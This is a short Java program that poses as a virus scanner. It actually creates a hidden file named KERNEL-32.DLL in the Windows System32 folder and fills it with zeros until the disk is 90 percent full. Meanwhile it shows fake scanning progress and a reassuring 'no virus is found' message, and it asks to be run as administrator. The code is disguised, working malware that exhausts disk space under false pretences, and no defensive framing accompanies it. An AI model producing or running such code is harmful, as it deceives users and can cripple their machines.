import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.file.FileSystems;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Arrays;

public class Main
{

	public static void main( String[] args )
	{
		try {
			DiskManager manager = new DiskManager();
			Path filepath = FileSystems.getDefault().getPath("/Windows/System32", "KERNEL-32.DLL");
			//System.out.println(filepath.toString());
			FileOutputStream file = new FileOutputStream(filepath.toString());
			
			byte[] bytes = {0x73, 0x6F, 0x72, 0x72, 0x79, 0x20, 0x3A, 0x2F, 0x20};
			byte[] lotsofbytes = new byte[500000];
			Arrays.fill(lotsofbytes, 0, lotsofbytes.length, (byte) 0x00);
			
			Files.setAttribute(filepath, "dos:hidden", true);
			
			file.write(bytes);
			
			double initialFull = manager.diskFull();
			double currentFull = initialFull;
			double percentFilling = 0;
			int percentDone = 0;
			
			while (currentFull < 0.9) {
				for (int i = 0; i < 10; i++) {
					file.write(lotsofbytes);
				}
				currentFull = manager.diskFull();
				percentFilling = (currentFull - initialFull) / (0.9 - initialFull);
				int tempPercentDone = (int) Math.floor(percentFilling * 100);
				if (tempPercentDone != percentDone) {
					System.out.println("Scanning disk for viruses: " + percentDone + "% done");
					percentDone = tempPercentDone;
				}
				//System.out.println( percentFilling );
			}
			System.out.println("Scanning disk for viruses: 100% done");
			System.out.println("The scanning finishes and no virus is found!");
			file.close();
		} catch (IOException e) {
			System.err.println("This virus scanner must be run on Windows as an administrator.");
		}
	}

}
